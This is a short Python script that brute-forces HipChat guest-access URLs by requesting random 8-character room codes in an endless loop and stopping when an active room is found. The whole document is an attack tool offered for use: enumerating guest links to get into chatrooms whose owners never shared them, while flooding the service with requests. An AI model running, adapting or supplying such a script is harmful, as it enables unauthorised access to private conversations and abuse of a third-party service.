#bruteforce, inefficient.

import random
import string
import requests
import sys
import re

def str_gen(size=8, chars=string.ascii_lowercase + string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def getURL(urlString):
    Url = "https://www.hipchat.com/g" + str(urlString)
    r=requests.get(Url)
    if r.status_code == 200:
        print ("Possible chatroom found: g"+urlString)
        if "This guest access URL is no longer valid." in r.text:
            print ("Inactive room :<")
            return True
        else:
           print ("Active room found at: g%s" % (urlString))
           sys.exit(0)
    else:
        print ("No room :< g%s" % (urlString) )
        return True

while getURL:
    getURL(str_gen())
